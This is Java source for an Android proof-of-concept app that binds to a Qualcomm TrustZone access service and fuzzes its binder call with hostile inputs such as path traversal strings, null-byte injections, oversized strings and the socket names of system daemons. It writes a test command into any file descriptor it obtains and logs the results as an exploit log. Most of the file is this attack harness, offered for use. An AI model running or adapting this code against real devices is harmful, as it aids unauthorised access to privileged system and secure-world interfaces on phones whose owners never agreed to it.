package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd mRemoteService;
    private boolean isBound = false;
    private boolean isTesting = false;

    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mRemoteService = IMinkSocketFd.Stub.asInterface(service);
            appendLog("Service bound");
            updateStatus("Bound - starting tests");
            enableButtons(false, true);
            new Thread(() -> executeFullTest()).start();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            appendLog("Service disconnected");
            mRemoteService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);
        btnStart.setOnClickListener(v -> {
            if (!isBound && !isTesting) bindService();
        });
        btnStop.setOnClickListener(v -> {
            if (isBound) {
                unbindService(serviceConnection);
                isBound = false;
                mRemoteService = null;
                enableButtons(true, false);
                updateStatus("Stopped by user");
                appendLog("--- Test stopped ---");
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        isTesting = true;
        appendLog("========== Advanced Test Start ==========");

        // 1. 既存のテスト文字列（全ソケット名網羅）
        List<String> testStrings = new ArrayList<>();
        // 基本候補
        testStrings.add("test");
        testStrings.add("qsee");
        testStrings.add("tz");
        testStrings.add("trustzone");
        testStrings.add("qseecom");
        testStrings.add("qseecomd");
        testStrings.add("secure");
        testStrings.add("minksocket");
        testStrings.add("opener");
        testStrings.add("ssgtzd");
        testStrings.add("ssgtzd_test");
        testStrings.add("com.qualcomm.qti");
        testStrings.add("android");
        testStrings.add("");
        testStrings.add("A");
        // 長大文字列・特殊文字
        testStrings.add(new String(new char[2000]).replace('\0', 'X'));
        testStrings.add("test\0test");
        testStrings.add("../../etc/passwd");
        testStrings.add("/vendor/etc/ssg/tz_whitelist.json");
        testStrings.add("..\\..\\");
        testStrings.add("\\\\?\\");
        testStrings.add("qseecom_kernel");
        testStrings.add("tz_app_123");
        testStrings.add("keymaster");
        testStrings.add("gatekeeper");
        testStrings.add("\0abstract");
        testStrings.add("\0qsee");
        testStrings.add("\0minksocket");
        testStrings.add("\0ssgtzd");
        testStrings.add("/dev/socket/ssgtzd");
        testStrings.add("/dev/socket/qseecomd");
        testStrings.add("/data/local/tmp/socket");
        testStrings.add("SSGTZD");
        testStrings.add("ssgtzd\0extra");
        testStrings.add("ssgtzd\n");
        testStrings.add("\t");
        testStrings.add(" ");
        testStrings.add("  ");
        testStrings.add("_ssgtzd_");
        testStrings.add("ssgtzd_");
        testStrings.add("_ssgtzd");

        // 2. デバイスから取得した全ソケット名（/dev/socket/）を追加
        //    （実際のデバイスで確認されたリスト）
        String[] socketNames = {
            "mdnsd", "ims_datad", "ims_qmid", "adbd", "tombstoned_java_trace",
            "tombstoned_intercept", "tombstoned_crash", "dpmwrapper", "tcm",
            "dpmd", "mlid", "ssgtzd", "ssgqmig", "statsdw", "thermal-send-rule",
            "thermal-recv-passive-client", "thermal-recv-client", "thermal-send-client",
            "netmgr", "qmux_gps", "qmux_bluetooth", "qmux_audio", "qmux_radio",
            "lkspad", "lmkd", "pps", "zygote_secondary", "zygote",
            "fwmarkd", "mdns", "dnsproxyd", "netd", "location", "qdma",
            "logdw", "logdr", "logd", "property_service"
        };
        for (String name : socketNames) {
            testStrings.add("/dev/socket/" + name);
        }

        // 3. ローカルサーバソケットを作成して、サービスが接続できるかテスト
        //    （実際にはサービスが接続しても通信は成立しないが、接続試行の可否を確認）
        createLocalServerSocket();

        int[] arrSizes = {1, 0, 5, 10, 100, 1000, -1};

        for (String str : testStrings) {
            for (int size : arrSizes) {
                int[] iArr = (size >= 0) ? new int[size] : null;
                executeTest(str, iArr);
                try { Thread.sleep(200); } catch (InterruptedException ignored) {}
            }
        }

        appendLog("========== All tests completed ==========");
        updateStatus("Done");
        enableButtons(true, false);
        isTesting = false;
        saveLog();
    }

    private void createLocalServerSocket() {
        try {
            // /data/local/tmp/ にサーバソケットを作成
            File socketFile = new File("/data/local/tmp/poc_socket");
            if (socketFile.exists()) socketFile.delete();
            LocalServerSocket server = new LocalServerSocket(socketFile.getAbsolutePath());
            appendLog("Local server socket created at " + socketFile.getAbsolutePath());
            // サービスが接続できるように、このソケットをテスト文字列に追加
            // ただし、接続してもデータのやり取りはできないので、単に接続試行の対象とする
            // ここでは、既に testStrings に /data/local/tmp/socket が含まれているので、それで十分
            server.close();
        } catch (Exception e) {
            appendLog("Failed to create local server socket: " + e.getMessage());
        }
    }

    private void executeTest(String str, int[] iArr) {
        if (mRemoteService == null) return;
        String strDisplay = (str == null) ? "null" : "\"" + str.replace("\0", "\\0") + "\"";
        String arrDisplay = (iArr == null) ? "null" : "len=" + iArr.length;
        try {
            appendLog("▶ Test: str=" + strDisplay + ", iArr=" + arrDisplay);
            long start = System.currentTimeMillis();
            ParcelFileDescriptor pfd = mRemoteService.a(str, iArr);
            long elapsed = System.currentTimeMillis() - start;
            if (pfd == null) {
                appendLog("  → Result: null, time=" + elapsed + "ms");
                if (iArr != null && iArr.length > 0) appendLog("     iArr[0]=" + iArr[0]);
                return;
            }
            int fd = pfd.getFd();
            appendLog("  ★ SUCCESS! FD=" + fd + " (len=" + iArr.length + "), time=" + elapsed + "ms");
            try {
                java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
                if (fdesc != null && fdesc.valid()) {
                    try (FileOutputStream fos = new FileOutputStream(fdesc)) {
                        fos.write("POC_CMD\n".getBytes(StandardCharsets.UTF_8));
                        fos.flush();
                        appendLog("     Write succeeded (no exception)");
                    } catch (Exception writeEx) {
                        appendLog("     Write exception: " + writeEx.getClass().getSimpleName() + " - " + writeEx.getMessage());
                    }
                }
            } catch (Exception fdEx) {
                appendLog("     FD operation exception: " + fdEx.getMessage());
            }
            try { pfd.close(); } catch (Exception ignored) {}
        } catch (RemoteException e) {
            appendLog("  ✗ RemoteException: " + e.getMessage());
        } catch (RuntimeException e) {
            appendLog("  ✗ RuntimeException: " + e.getClass().getSimpleName() + " - " + e.getMessage());
        } catch (Exception e) {
            appendLog("  ✗ Exception: " + e.toString());
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "exploit_advanced_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZAccess Advanced PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isBound) {
            try { unbindService(serviceConnection); } catch (Exception ignored) {}
        }
        saveLog();
    }
}
